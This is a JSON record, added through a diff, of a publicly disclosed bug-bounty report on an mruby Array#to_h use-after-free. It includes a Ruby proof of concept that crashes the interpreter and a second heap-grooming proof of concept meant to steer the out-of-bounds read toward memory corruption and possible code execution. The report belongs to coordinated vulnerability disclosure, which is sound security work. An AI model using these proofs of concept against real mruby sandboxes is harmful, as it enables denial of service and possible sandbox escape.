@@ -1,0 +1,120 @@
+{
+  "id": 181321,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODEzMjE=",
+  "url": "https://hackerone.com/reports/181321",
+  "title": "Use after free vulnerability in mruby Array#to_h causing DOS possible RCE",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2016-11-10T13:19:17.278Z",
+  "submitted_at": "2016-11-10T13:19:17.278Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "isra17",
+    "url": "/isra17",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 15668,
+    "url": "https://hackerone.com/shopify-scripts",
+    "handle": "shopify-scripts",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "shopify-scripts",
+      "twitter_handle": "",
+      "website": "",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2016-12-16T20:05:00.076Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-12-16T20:05:00.029Z",
+  "team_member_agreed_on_going_public_at": "2016-12-16T19:46:22.718Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "This bug was found with `jmlb337`.\n\n## Vulnerability \nThe function `to_h` will call the C function  `mrb_ary_to_h`.  This will iterate through the elements of the array.  If an element is not of type Array it will call attempt to call `to_ary` method of that object.  If `to_ary` does not return an array, the function will raise a ruby exception with the class name in the exception message.\n\nHowever, the code does not properly check that the array length was not modified during the call of `to_ary`. The vulnerability is triggered when the array is shrunk during call to `to_ary`, letting `mrb_ary_to_h` read an out of bound object to get an element classname.  A crash or or denial of service can be triggered by neutering the array in the `to_ary` call. A `mrb_obj_iv_set` call done on the controlled class pointer can be used to have a memory write leading to RCE.\n\n\n## Reproduction Step\n1. Define a new class that will define the method `to_ary`.\n2. in the `to_ary` clear a global array that will be later define and return a non array object.\n3. Create the global array containing an instance of the defined class.\n4. Call `to_h` on that array.\n\n## PoC DOS\n```ruby\nclass A\n  def to_ary\n    $a.clear\n    nil\n  end\nend\n$a = [A.new]\n$a.to_h\n```\nThis POC will cause a null memory access and terminate the mruby process.\n\n## Explaination\nThe bug is triggered due to call back to `to_ary` in [array.c:130](https://github.com/mruby/mruby/blob/master/mrbgems/mruby-array-ext/src/array.c#L130): \n```c\n v = mrb_check_array_type(mrb, RARRAY_PTR(ary)[i]);\n```\n\nThe function `mrb_check_array_type` check if the element at `RARRAY_PTR(ary)[i]`.  in the case of the POC it will be of type `A`.  It will then continue to call the `to_ary` method of the `A` class to convert the value into an array.\n\n```c\nMRB_API mrb_value\nmrb_check_array_type(mrb_state *mrb, mrb_value ary)\n{\n  return mrb_check_convert_type(mrb, ary, MRB_TT_ARRAY, \"Array\", \"to_ary\");\n}\n\nMRB_API mrb_value\nmrb_check_convert_type(mrb_state *mrb, mrb_value val, enum mrb_vtype type, const char *tname, const char *method)\n{\n  mrb_value v;\n\n  if (mrb_type(val) == type && type != MRB_TT_DATA) return val;\n  v = convert_type(mrb, val, tname, method, FALSE);\n  if (mrb_nil_p(v) || mrb_type(v) != type) return mrb_nil_value();\n  return v;\n}\n```\n\nBy calling the `Array#clear` method on the global array, the pointer to the array data (`ptr`) will be set to null.\n```c\nMRB_API mrb_value\nmrb_ary_clear(mrb_state *mrb, mrb_value self)\n{\n...\n  a->len = 0;\n  a->aux.capa = 0;\n  a->ptr = 0;\n...\n```\n\nSince `to_ary` will not return an array, the C code will attempt to raise an exception with the class name in the exception message.\n```c\n if (mrb_nil_p(v)) {\n      mrb_raisef(mrb, E_TYPE_ERROR, \"wrong element type %S at %S (expected array)\",\n        mrb_str_new_cstr(mrb,  mrb_obj_classname(mrb, RARRAY_PTR(ary)[i])),\n```\nwhen it calls `RARRAY_PTR(ary)[i]` it will attempt to reference `0[i]` and crash the process.\n\n## Exploitability\n\nThe vulnerability is exploitable as long as the attacker can run arbitrary ruby code in the mruby interpreter. It should cover mruby-engine case as used by Shopify.\n\n## Impact\n\nThis vulnerability can cause a Denial Of service on the mruby process very reliably.  It could also lead to farther memory corruption and potentially lead to Remote Code Execution.\n\nWe are convinced we can push this bug further to lead to memory corruption and RCE. I spoke with François Chagnon and we preferred to report the bugs as soon as possible while working on a complete proof of concept afterward so it can get patched earlier. Therefor we would like a week or two to get time to work on this and be able to claim the higher tier bounty. The proof of concept would also used the other reported bug [#181319](https://hackerone.com/reports/181319) to get a memory disclosure.\n\n## Possible Remote Code Execution POC #2\n```ruby\n$size = 32\n$bb = []\nfor i in 0..256\n $bb.push(\"b\"*$size)\nend\n\nclass A\n def to_ary\n   $bb.clear\n   $a.clear\n   $a.push(\"b\"*256)\n   #first byte is 0 as long as the lsb != 1 its fine\n   $a.push(\"\\x00bcdefg\\x70hijklmnopqurtuvwxyzABCDEFGHIJKLMNOPQRSTUVWXY\"*3 + (\"a\"*200))\n   $a.push(\"y\"*256)\n   $a.push(\"e\"*256)\n\n   return \"a\"\n end\nend\n\n$a = [[1,\"a\"],[1,\"a\"],[1,\"a\"],[1,\"a\"],[1,\"a\"],[1,\"a\"],A.new]\n\nfor i in 0..256\n $bb.push(\"z\"*$size)\nend\n\n@a = $a.to_h\n```\n\n## Exploitation\nIn the second POC, and attacker creates an array of 7 elements where the last element has an object with the vulnerable to_ary method.  7 elements is important because when the bug is triggered the index of the array will be out of bounds by 3 pointer size.  That is where our data will be.\n\nafter clearing the global array push some elements back into the array. No more than 4 since that will increase the capacity of the array to 8 and our index will not be out of bounds.\n\nby pushing the large strings the data of the strings will be placed after the array data.  When the call is made to `mrb_obj_classname(mrb, RARRAY_PTR(ary)[i])`,\nuser controlled data will be returned.  \n\nAn attacker could then craft an `mrb_value` object using the strings and cause farther memory corruption.\n\nThere exists code paths that could allow an attacker to right data to a pointer crafted by the attacker.\n\n## Proposed Fix\n\nSee patch in attachment.\n",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2017-01-15T19:46:22.752Z",
+  "allow_singular_disclosure_after": -293830847.8197661,
+  "singular_disclosure_allowed": true,
+  "vote_count": 29,
+  "voters": [
+    "isra17",
+    "dkasak",
+    "bogdantc",
+    "michiel",
+    "bl4de",
+    "mdv",
+    "mpz",
+    "r3y",
+    "eveeez",
+    "khizer47",
+    "and 19 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
